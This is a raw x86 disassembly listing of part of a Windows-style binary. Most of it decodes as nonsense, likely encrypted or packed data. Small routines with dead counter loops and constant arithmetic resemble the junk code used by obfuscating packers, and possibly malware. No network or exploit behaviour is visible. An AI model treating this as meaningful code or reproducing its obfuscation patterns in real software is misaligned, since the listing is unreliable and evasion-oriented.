  40e9a9:	fiadd  DWORD PTR [ebx-0x66e67683]
  40e9af:	jl     0x40e99c
  40e9b1:	pop    ss
  40e9b2:	inc    edi
  40e9b3:	arpl   WORD PTR [ebp+0x6625e4c6],sp
  40e9b9:	push   ecx
  40e9ba:	aad    0x8e
  40e9bc:	fcmovnbe st,st(2)
  40e9be:	mov    eax,0x8d69ea5
  40e9c3:	pop    esp
  40e9c4:	(bad)  
  40e9c6:	cld    
  40e9c7:	test   DWORD PTR [ecx],0xc171a599
  40e9cd:	(bad)  
  40e9ce:	jne    0x40ea31
  40e9d0:	sbb    al,BYTE PTR ds:0x4562e179
  40e9d6:	(bad)  
  40e9d7:	mov    esp,0x3f1bdbd2
  40e9dc:	fwait
  40e9dd:	aam    0x13
  40e9df:	or     ecx,esi
  40e9e1:	std    
  40e9e2:	ss and esp,edi
  40e9e5:	test   BYTE PTR [esi-0x39],0x3b
  40e9e9:	mov    esi,eax
  40e9eb:	daa    
  40e9ec:	fadd   DWORD PTR [edi-0x3ed13ee]
  40e9f2:	xchg   ebx,eax
  40e9f3:	add    DWORD PTR [ebp-0x456989e0],ecx
  40e9f9:	xor    ebp,DWORD PTR [eax-0x4f]
  40e9fc:	mov    ah,0x5f
  40e9fe:	cmp    eax,0xf112c0a3
  40ea03:	out    0xa4,al
  40ea05:	xor    bl,BYTE PTR [edx+ebp*2+0x28]
  40ea09:	retf   
  40ea0a:	push   0xffffffa6
  40ea0c:	je     0x40e9ea
  40ea0e:	inc    esi
  40ea0f:	xchg   ecx,eax
  40ea10:	mov    ds:0x5baf9744,al
  40ea15:	jnp    0x40e9d8
  40ea17:	out    dx,al
  40ea18:	repnz aam 0xa7
  40ea1b:	dec    ecx
  40ea1c:	mov    edx,0xdc5a936d
  40ea21:	adc    DWORD PTR [ebx-0x63455f42],esp
  40ea27:	mov    esi,0x5f429c4a
  40ea2c:	and    DWORD PTR ds:0x7886d4e2,esi
  40ea32:	mov    esi,0x99f42386
  40ea37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea38:	push   cs
  40ea39:	push   cs
  40ea3a:	popa   
  40ea3b:	js     0x40ea41
  40ea3d:	imul   ebp,DWORD PTR [edi+ebp*2+0x26],0x28
  40ea42:	mov    gs,WORD PTR [ebp-0x61]
  40ea45:	ins    DWORD PTR es:[edi],dx
  40ea46:	pushf  
  40ea47:	mov    ds:0x406174f5,al
  40ea4c:	mov    esp,0x3b938ed5
  40ea51:	ror    DWORD PTR ds:0xa245b70c,1
  40ea57:	jnp    0x40e9f8
  40ea59:	add    BYTE PTR [eax+0x475f5fc8],al
  40ea5f:	adc    al,0x78
  40ea61:	arpl   WORD PTR [ecx+0x3c012fba],ax
  40ea67:	lahf   
  40ea68:	xchg   edi,eax
  40ea69:	call   0x836:0x775faa7b
  40ea70:	pop    es
  40ea71:	mov    ebx,0x63d63d85
  40ea76:	adc    BYTE PTR [ebx+ecx*1+0x5c],0x3f
  40ea7b:	aad    0xfb
  40ea7d:	sbb    eax,0xb9ac7e9d
  40ea82:	rol    DWORD PTR [ebx+0x27],1
  40ea85:	pushf  
  40ea86:	lods   al,BYTE PTR ds:[esi]
  40ea87:	repnz sbb BYTE PTR [eax+0x4e],0xb
  40ea8c:	adc    dh,BYTE PTR [eax+edi*1]
  40ea8f:	mov    edx,0x109b5340
  40ea94:	call   0xd6b8:0x74962799
  40ea9b:	int3   
  40ea9c:	in     al,dx
  40ea9d:	cmp    edi,ebp
  40ea9f:	jnp    0x40eaf3
  40eaa1:	fbld   TBYTE PTR [ecx-0x6b]
  40eaa4:	or     BYTE PTR [ebx+0x64e7e37e],dl
  40eaaa:	or     DWORD PTR [eax+0x16a4ac3a],eax
  40eab0:	icebp  
  40eab1:	and    ebx,ebp
  40eab3:	lea    eax,[esi+0x2f]
  40eab6:	push   esp
  40eab7:	lock jecxz 0x40ea85
  40eaba:	push   0x2d
  40eabc:	imul   eax,DWORD PTR [edi-0xf],0x76
  40eac0:	retf   0xc303
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dl,bl
  40ebb4:	retf   0xb8b4
  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40ebed
  40ebc0:	sahf   
  40ebc1:	fistp  DWORD PTR [ecx]
  40ebc3:	jmp    ebp
  40ebc5:	into   
  40ebc6:	out    dx,eax
  40ebc7:	xor    bl,BYTE PTR [eax+0x39f6110e]
  40ebcd:	push   0x4c2a0873
  40ebd2:	inc    ecx
  40ebd3:	loopne 0x40ec4f
  40ebd5:	loop   0x40ebdf
  40ebd7:	xchg   esi,eax
  40ebd8:	std    
  40ebd9:	outs   dx,BYTE PTR ds:[esi]
  40ebda:	jmp    0x40ebdb
  40ebdc:	fs pop ds
  40ebde:	aad    0xd1
  40ebe0:	xchg   edi,eax
  40ebe1:	pop    esi
  40ebe2:	fimul  WORD PTR [ecx-0x6be15e3c]
  40ebe8:	pushf  
  40ebe9:	mul    DWORD PTR [eax]
  40ebeb:	mov    edx,0xb5988dd3
  40ebf0:	add    ecx,DWORD PTR [ebp+0x2228ddfa]
  40ebf6:	mov    bh,0xdf
  40ebf8:	stos   BYTE PTR es:[edi],al
  40ebf9:	ds pusha 
  40ebfb:	mov    al,ds:0xf5767da
  40ec00:	or     DWORD PTR [ecx-0x6cab5e44],eax
  40ec06:	aas    
  40ec07:	bound  ecx,QWORD PTR [eax+0x3]
  40ec0a:	xchg   edi,eax
  40ec0b:	cmp    ch,ch
  40ec0d:	push   ebx
  40ec0e:	inc    eax
  40ec0f:	dec    edx
  40ec10:	push   ebx
  40ec11:	jno    0x40ec2c
  40ec13:	rcl    DWORD PTR [edx+0x7],0x2a
  40ec17:	cmp    bl,BYTE PTR [edi]
  40ec19:	mov    al,ds:0x28087a59
  40ec1e:	sbb    al,0xb5
  40ec20:	mov    ebx,0xfd36b1be
  40ec25:	pushf  
  40ec26:	es push edi
  40ec28:	fist   WORD PTR [esi]
  40ec2a:	xchg   DWORD PTR [ebx+esi*1+0x63],ebx
  40ec2e:	cmc    
  40ec2f:	dec    eax
  40ec30:	or     BYTE PTR [ebx+0x3d192740],dh
  40ec36:	das    
  40ec37:	ds mov bh,0x53
  40ec3a:	sbb    ecx,DWORD PTR [edx]
  40ec3c:	leave  
  40ec3d:	inc    esi
  40ec3e:	les    ebx,FWORD PTR [ebp+ecx*1+0x56ea8b6b]
  40ec45:	mov    WORD PTR ds:0x31df90a0,ds
  40ec4b:	inc    eax
  40ec4c:	in     al,dx
  40ec4d:	jmp    0x9eed51d5
  40ec52:	mov    esp,?
  40ec54:	and    al,0x8a
  40ec56:	xor    dl,bh
  40ec58:	adc    eax,0x1520c03b
  40ec5d:	xchg   ebp,eax
  40ec5e:	pusha  
  40ec5f:	shl    DWORD PTR [edi],1
  40ec61:	fist   DWORD PTR [ebp-0x6d8a35f1]
  40ec67:	lahf   
  40ec68:	inc    ecx
  40ec69:	enter  0xeed2,0xd6
  40ec6d:	mov    bh,0xff
  40ec6f:	jbe    0x40ec07
  40ec71:	xchg   ebx,eax
  40ec72:	xchg   edi,eax
  40ec73:	es out 0x43,eax
  40ec76:	xchg   ecx,eax
  40ec77:	shl    DWORD PTR [esi+edx*1-0x3e],cl
  40ec7b:	fcomp  QWORD PTR [ebp+edi*8-0x11aac428]
  40ec82:	(bad)  
  40ec83:	nop
  40ec84:	mov    ebx,0xef9f48f0
  40ec89:	test   eax,0xecb1412b
  40ec8e:	loopne 0x40ec11
  40ec90:	inc    esp
  40ec91:	mov    ds:0x8b1bdecc,al
  40ec96:	mov    bh,0x1d
  40ec98:	sbb    al,BYTE PTR [ebp+0x28]
  40ec9b:	shr    BYTE PTR [edi-0x3c],1
  40ec9e:	jb     0x40ecb4
  40eca0:	and    al,0xbd
  40eca2:	mov    bl,0x31
  40eca4:	outs   dx,DWORD PTR ds:[esi]
  40eca5:	jecxz  0x40ec2f
  40eca7:	add    al,0x2
  40eca9:	enter  0xea6c,0xfb
  40ecad:	sub    bh,BYTE PTR [ecx]
  40ecaf:	and    ah,BYTE PTR [esi-0x50]
  40ecb2:	push   esi
  40ecb3:	ins    DWORD PTR es:[edi],dx
  40ecb4:	push   es
  40ecb5:	ins    DWORD PTR es:[edi],dx
  40ecb6:	outs   dx,DWORD PTR ds:[esi]
  40ecb7:	jecxz  0x40ed08
  40ecb9:	push   0x70589e3b
  40ecbe:	sub    eax,0xa60969bd
  40ecc3:	mov    es,esi
  40ecc5:	test   eax,0x31cb4d4a
  40ecca:	dec    edi
  40eccb:	adc    eax,0xbd6e88ab
  40ecd0:	clc    
  40ecd1:	ror    DWORD PTR [edi-0x598fd73],1
  40ecd7:	jns    0x40ecb4
  40ecd9:	xor    ch,BYTE PTR ds:0x505e7403
  40ecdf:	and    dh,BYTE PTR [esi+eiz*1+0x5c0a4190]
  40ece6:	mov    cl,0xba
  40ece8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece9:	in     al,dx
  40ecea:	fwait
  40eceb:	cmp    eax,0x973414ef
  40ecf0:	xor    ecx,edx
  40ecf2:	out    dx,al
  40ecf3:	scas   al,BYTE PTR es:[edi]
  40ecf4:	push   esi
  40ecf5:	ret    
  40ecf6:	int    0xae
  40ecf8:	jne    0x40ecce
  40ecfa:	test   DWORD PTR [ebx-0x2],esp
  40ecfd:	addr16 je 0x40ed08
  40ed00:	mov    eax,0xa5cf80a
  40ed05:	fidivr WORD PTR [ebp-0x301d2776]
  40ed0b:	cmc    
  40ed0c:	mov    eax,ds:0x26abdbab
  40ed11:	sbb    dh,bl
  40ed13:	rol    BYTE PTR [edx-0x2ec6f82f],1
  40ed19:	xor    eax,0x458fc636
  40ed1e:	retf   
  40ed1f:	test   BYTE PTR [esi],bh
  40ed21:	loopne 0x40ed5c
  40ed23:	rcr    al,1
  40ed25:	xor    DWORD PTR [edi+eax*2],0x1be87f5
  40ed2c:	mov    al,ds:0xc68fe28c
  40ed31:	aaa    
  40ed32:	mov    edi,0x40d055ab
  40ed37:	stc    
  40ed38:	jg     0x40ecd0
  40ed3a:	xor    bh,BYTE PTR [ecx+0x3112cc4]
  40ed40:	or     eax,0x2976bbb7
  40ed45:	into   
  40ed46:	std    
  40ed47:	loope  0x40ed4e
  40ed49:	mov    esi,0x64bbcf86
  40ed4e:	mov    ecx,0x7c0e52f6
  40ed53:	xchg   edx,eax
  40ed54:	(bad)  
  40ed55:	outs   dx,DWORD PTR ds:[esi]
  40ed56:	mov    dh,0xff
  40ed58:	shl    BYTE PTR [ecx-0x1],cl
  40ed5b:	pop    ds
  40ed5c:	adc    BYTE PTR [edi],ah
  40ed5e:	mov    es,WORD PTR [edi+0x6ac7349a]
  40ed64:	test   BYTE PTR [ebp-0xdd3243f],ch
  40ed6a:	mov    dl,0xe1
  40ed6c:	lea    edx,[eax+ecx*4]
  40ed6f:	sar    DWORD PTR [edi],1
  40ed71:	jne    0x40ed4e
  40ed73:	or     esp,DWORD PTR [esp+ebp*8]
  40ed76:	in     al,0xaf
  40ed78:	inc    edx
  40ed79:	rol    DWORD PTR [esi],cl
  40ed7b:	loope  0x40ed73
  40ed7d:	push   0x51ca4775
  40ed82:	inc    edx
  40ed83:	mov    ebp,0xefd085b1
  40ed88:	ror    BYTE PTR [eax],cl
  40ed8a:	or     esp,esp
  40ed8c:	std    
  40ed8d:	adc    ch,dl
  40ed8f:	shl    edx,cl
  40ed91:	pop    DWORD PTR [ebp+0x6a]
  40ed94:	mov    ch,BYTE PTR [edx]
  40ed96:	mov    esi,0xc233d4df
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x7090bc26]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	arpl   WORD PTR [edi],ax
  40ee78:	sub    eax,0xe11ef3fa
  40ee7d:	xor    ecx,DWORD PTR [eax-0x1b48e7ee]
  40ee83:	jl     0x40ee54
  40ee85:	and    DWORD PTR [eax-0x38],ecx
  40ee88:	fcom   QWORD PTR [edi-0x46e127fd]
  40ee8e:	xchg   ecx,eax
  40ee8f:	(bad)  
  40ee90:	xor    al,0x6d
  40ee92:	test   DWORD PTR ds:0xb02dc7be,ebp
  40ee98:	jne    0x40eef4
  40ee9a:	xor    eax,0xff25e2d3
  40ee9f:	mov    al,BYTE PTR [edx-0x4de9d5a9]
  40eea5:	int3   
  40eea6:	pusha  
  40eea7:	dec    esp
  40eea8:	pop    ecx
  40eea9:	in     al,0x30
  40eeab:	and    eax,0x992095a8
  40eeb0:	out    dx,al
  40eeb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeb2:	ss jb  0x40ee8b
  40eeb5:	push   edi
  40eeb6:	in     eax,dx
  40eeb7:	gs test eax,0xa374a903
  40eebd:	mov    al,ds:0xccb515b2
  40eec2:	push   es
  40eec3:	cmp    cl,ah
  40eec5:	stos   DWORD PTR es:[edi],eax
  40eec6:	adc    DWORD PTR [ebx-0x100b4b20],ebp
  40eecc:	push   0xffffffb6
  40eece:	cmp    DWORD PTR [ecx],esi
  40eed0:	jmp    0xe7344dbb
  40eed5:	das    
  40eed6:	adc    al,0xa2
  40eed8:	sbb    edi,DWORD PTR [ebp+0x6424c95f]
  40eede:	outs   dx,BYTE PTR ds:[esi]
  40eedf:	out    0x3f,eax
  40eee1:	out    0x56,al
  40eee3:	repnz xchg ebp,eax
  40eee5:	test   DWORD PTR [ebp-0x3],0x1d1bfa7
  40eeec:	int    0x44
  40eeee:	bound  eax,QWORD PTR [esi]
  40eef0:	ins    DWORD PTR es:[edi],dx
  40eef1:	or     dl,BYTE PTR [esp+ecx*4+0x6d]
  40eef5:	dec    esp
  40eef6:	mov    edx,0xc98ab333
  40eefb:	push   es
  40eefc:	add    DWORD PTR [ebp+0x1f],ebx
  40eeff:	lds    ecx,FWORD PTR [edi+eiz*4]
  40ef02:	(bad)  
  40ef04:	ins    BYTE PTR es:[edi],dx
  40ef05:	je     0x40ef45
  40ef07:	cld    
  40ef08:	aad    0x35
  40ef0a:	dec    edi
  40ef0b:	(bad)  
  40ef0c:	jecxz  0x40ef38
  40ef0e:	ja     0x40eea5
  40ef10:	fisub  DWORD PTR [esi]
  40ef12:	cld    
  40ef13:	dec    esi
  40ef14:	in     eax,0x7e
  40ef16:	cmp    edx,DWORD PTR [eax-0x6807d38e]
  40ef1c:	ins    BYTE PTR es:[edi],dx
  40ef1d:	mov    eax,ds:0x97021c47
  40ef22:	fs cli 
  40ef24:	mov    ebx,0x8bf58dea
  40ef29:	into   
  40ef2a:	call   0x5b58e7fb
  40ef2f:	xlat   BYTE PTR ds:[ebx]
  40ef30:	sbb    al,dh
  40ef32:	pop    es
  40ef33:	and    DWORD PTR [eax],esi
  40ef35:	leave  
  40ef36:	add    BYTE PTR [ebp-0x3ab00848],dl
  40ef3c:	push   cs
  40ef3d:	adc    DWORD PTR [edx-0x1c16e1e3],esp
  40ef43:	mov    ds:0xde706b07,al
  40ef48:	xchg   ebp,eax
  40ef49:	jle    0x40eeff
  40ef4b:	add    ah,BYTE PTR [edi+eax*4]
  40ef4e:	cdq    
  40ef4f:	shr    BYTE PTR [ebx+0x2272513b],1
  40ef55:	fistp  QWORD PTR [ebx-0x24e1489d]
  40ef5b:	call   0xff0c0435
  40ef60:	sub    al,0xd9
  40ef62:	pop    ss
  40ef63:	pop    esp
  40ef64:	ror    BYTE PTR [edx-0x36401228],cl
  40ef6a:	jbe    0x40ef69
  40ef6c:	pop    eax
  40ef6d:	mov    al,0xf
  40ef6f:	dec    ebx
  40ef70:	sbb    eax,0x403e6d78
  40ef75:	mov    esi,0xe079dca0
  40ef7a:	dec    DWORD PTR [edi-0x6cd62cd9]
  40ef80:	lahf   
  40ef81:	int    0x8
  40ef83:	cmp    DWORD PTR [edi-0x1a5e1962],0x1e
  40ef8a:	or     esi,ebx
  40ef8c:	mov    ?,WORD PTR [eax]
  40ef8e:	xchg   esi,eax
  40ef8f:	pop    es
  40ef90:	(bad)  
  40ef92:	mov    ch,0x87
  40ef94:	mov    cl,0x99
  40ef96:	shr    esp,0x31
  40ef99:	rol    BYTE PTR [edi],cl
  40ef9b:	pop    ds
  40ef9c:	and    esi,DWORD PTR [edx+0xe]
  40ef9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa0:	scas   eax,DWORD PTR es:[edi]
  40efa1:	push   0x91e5b513
  40efa6:	inc    ebp
  40efa7:	mov    cl,0x83
  40efa9:	or     ebp,DWORD PTR [ebp-0x2]
  40efac:	cmc    
  40efad:	jg     0x40ef8a
  40efaf:	test   al,0xaa
  40efb1:	(bad)  
  40efb2:	mov    dl,bl
  40efb4:	xor    dl,ah
  40efb6:	ds daa 
  40efb8:	enter  0x3dd9,0x18
  40efbc:	enter  0xe73d,0x41
  40efc0:	mov    ch,0x9a
  40efc2:	inc    ecx
  40efc3:	ror    DWORD PTR [esi-0x7961af89],1
  40efc9:	cmp    esp,eax
  40efcb:	out    0x14,al
  40efcd:	jnp    0x40ef99
  40efcf:	xchg   DWORD PTR [ebp+0x66159599],ebx
  40efd5:	push   ecx
  40efd6:	jmp    0x4644:0x909ea266
  40efdd:	imul   edi,DWORD PTR ds:[ecx],0x36
  40efe1:	out    0x76,eax
  40efe3:	xor    BYTE PTR [edi-0x20],al
  40efe6:	fadd   st(4),st
  40efe8:	fadd   DWORD PTR [ebp+0x7e]
  40efeb:	add    eax,0x125dd26c
  40eff0:	mov    ebp,0xc7cb167f
  40eff5:	or     al,0x9c
  40eff7:	arpl   WORD PTR [edi+0x5],bp
  40effa:	adc    ebx,DWORD PTR [edx-0x34f3a76b]
  40f000:	out    0x45,al
  40f002:	add    eax,0xc2246915
  40f007:	jl     0x40f02a
  40f009:	rcl    ch,1
  40f00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f00c:	call   DWORD PTR [ebp+0x5d896678]
  40f012:	inc    esp
  40f013:	mul    BYTE PTR [ecx]
  40f015:	sub    eax,0x739dd373
  40f01a:	mov    DWORD PTR [edi+0x189775a6],0x8fe92a13
  40f024:	lock hlt 
  40f026:	(bad)  
  40f027:	sbb    ah,cl
  40f029:	mov    eax,ds:0xf00dee7f
  40f02e:	dec    ebx
  40f02f:	call   eax
  40f031:	sub    al,BYTE PTR [esi+0x4dd6a86d]
  40f037:	loopne 0x40effd
  40f039:	outs   dx,DWORD PTR ds:[esi]
  40f03a:	es out 0x9c,eax
  40f03d:	sbb    BYTE PTR [eax+eiz*2],bl
  40f040:	mov    ah,BYTE PTR [eax-0x56c336a2]
  40f046:	sub    eax,0x817e1c1f
  40f04b:	test   al,0xd8
  40f04d:	and    edi,eax
  40f04f:	jl     0x40efdc
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xc8e31594,ebx
  40f076:	mov    al,ds:0x7ea1d666
  40f07b:	jle    0x40f0f9
  40f07d:	jge    0x40f0fd
  40f07f:	jle    0x40f04d
  40f081:	mov    cl,0x80
  40f083:	call   0x71e54e15
  40f088:	dec    esp
  40f089:	je     0x40f096
  40f08b:	or     eax,0xbb398493
  40f090:	fcomp  QWORD PTR [esi+0x72]
  40f093:	inc    eax
  40f094:	jae    0x40f078
  40f096:	sbb    cl,BYTE PTR [esi+0x2bed671c]
  40f09c:	jmp    0x9287:0xd2f6c823
  40f0a3:	pushf  
  40f0a4:	add    DWORD PTR [esi+eiz*2+0x7f],eax
  40f0a8:	and    DWORD PTR [edx+eax*4+0x49],ecx
  40f0ac:	pop    edi
  40f0ad:	outs   dx,BYTE PTR ds:[esi]
  40f0ae:	pop    ebx
  40f0af:	jo     0x40f0e0
  40f0b1:	repz adc bl,BYTE PTR [esi-0x3c02b58]
  40f0b8:	fcomp  DWORD PTR [esi-0x64c2050a]
  40f0be:	aad    0xf9
  40f0c0:	das    
  40f0c1:	(bad)  
  40f0c2:	push   esp
  40f0c3:	xor    DWORD PTR [esi+0x29],esp
  40f0c6:	iret   
  40f0c7:	stc    
  40f0c8:	sbb    esp,eax
  40f0ca:	je     0x40f0a9
  40f0cc:	lock inc eax
  40f0ce:	(bad)  
  40f0d0:	and    bl,bl
  40f0d2:	rol    ebx,1
  40f0d4:	mov    eax,0xeb5ac698
  40f0d9:	mov    esi,0x1e4d26d2
  40f0de:	call   0x9347:0x76667ba3
  40f0e5:	nop
  40f0e6:	and    DWORD PTR [edx],esi
  40f0e8:	sahf   
  40f0e9:	xchg   ebp,eax
  40f0ea:	xor    DWORD PTR [ebp-0x735c916a],edi
  40f0f0:	xchg   ecx,esi
  40f0f2:	test   eax,0x16e4f98
  40f0f7:	ins    BYTE PTR es:[edi],dx
  40f0f8:	xor    BYTE PTR ds:0x1a482c27,al
  40f0fe:	dec    eax
  40f0ff:	retf   0xd508
  40f102:	outs   dx,DWORD PTR ds:[esi]
  40f103:	adc    eax,0x84f68fd1
  40f108:	jne    0x40f0ac
  40f10a:	test   DWORD PTR [eax],esi
  40f10c:	ja     0x40f0ec
  40f10e:	or     dh,0xc9
  40f111:	sti    
  40f112:	imul   edi,DWORD PTR [ecx-0x25021639],0x3fbc1c10
  40f11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f11d:	aas    
  40f11e:	popa   
  40f11f:	data16 fstp DWORD PTR [eax+0x54]
  40f123:	push   ds
  40f124:	push   ebp
  40f125:	pop    ebp
  40f126:	inc    ebp
  40f127:	dec    ebp
  40f128:	test   BYTE PTR [eax],bh
  40f12a:	xchg   ebx,eax
  40f12b:	enter  0x78b4,0x76
  40f12f:	jnp    0x40f0b2
  40f131:	jp     0x40f13e
  40f133:	loopne 0x40f0be
  40f135:	jnp    0x40f0db
  40f137:	cmc    
  40f138:	(bad)  
  40f13a:	xor    edx,esp
  40f13c:	int    0x5c
  40f13e:	cmp    eax,0x582a7e6e
  40f143:	pop    edx
  40f144:	mov    cl,0x29
  40f146:	fnsave ds:0x18cc06ea
  40f14c:	ret    0x7bc3
  40f14f:	jbe    0x40f0ea
  40f151:	sahf   
  40f152:	mov    ecx,0xef7e541b
  40f157:	mov    esi,0xbf2bf207
  40f15c:	sbb    ecx,DWORD PTR [edx]
  40f15e:	xor    eax,DWORD PTR [ebp+0x33b6b478]
  40f164:	inc    eax
  40f165:	lods   eax,DWORD PTR ds:[esi]
  40f166:	sub    BYTE PTR [eax-0x17],al
  40f169:	push   ebp
  40f16a:	xor    al,0x96
  40f16c:	mov    ch,0xe6
  40f16e:	add    al,0xa9
  40f170:	add    al,0x31
  40f172:	mov    bl,0xa6
  40f174:	sub    BYTE PTR [edx],0x76
  40f177:	js     0x40f12c
  40f179:	es fs test eax,0x2547504
  40f180:	gs mov edi,0x59711fa2
  40f186:	mov    al,0x3d
  40f188:	mov    ebx,0xbb581b2d
  40f18d:	jo     0x40f1b7
  40f18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f190:	stos   BYTE PTR es:[edi],al
  40f191:	out    dx,eax
  40f192:	loope  0x40f15a
  40f194:	popf   
  40f195:	mov    cl,0xdf
  40f197:	(bad)  
  40f198:	sbb    al,0xf5
  40f19a:	imul   eax,DWORD PTR [ebx-0x6d],0xa09699bf
  40f1a1:	mov    ebx,0xcdec3b79
  40f1a6:	dec    eax
  40f1a7:	js     0x40f198
  40f1a9:	or     DWORD PTR [eax],esp
  40f1ab:	sub    eax,DWORD PTR [edi-0x7edfe726]
  40f1b1:	or     eax,0xef98a2d1
  40f1b6:	dec    ebx
  40f1b7:	dec    edx
  40f1b8:	adc    ebp,DWORD PTR [ebx+eiz*2-0x39]
  40f1bc:	fstp   QWORD PTR [esi-0x51]
  40f1bf:	adc    BYTE PTR [edi],0xa8
  40f1c2:	cli    
  40f1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c4:	pusha  
  40f1c5:	js     0x40f16a
  40f1c7:	sahf   
  40f1c8:	sub    edx,DWORD PTR [edi]
  40f1ca:	scas   al,BYTE PTR es:[edi]
  40f1cb:	and    eax,0x2e85112f
  40f1d0:	cs clc 
  40f1d2:	push   ebx
  40f1d3:	test   eax,0x940b25f8
  40f1d8:	dec    esi
  40f1d9:	daa    
  40f1da:	xchg   ebp,esp
  40f1dc:	or     ebp,DWORD PTR [edx*2+0x29c53419]
  40f1e3:	std    
  40f1e4:	cmc    
  40f1e5:	ficom  WORD PTR [ebx+0x77]
  40f1e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e9:	and    eax,0xf56c2f7c
  40f1ee:	mov    ebx,0xe1abee04
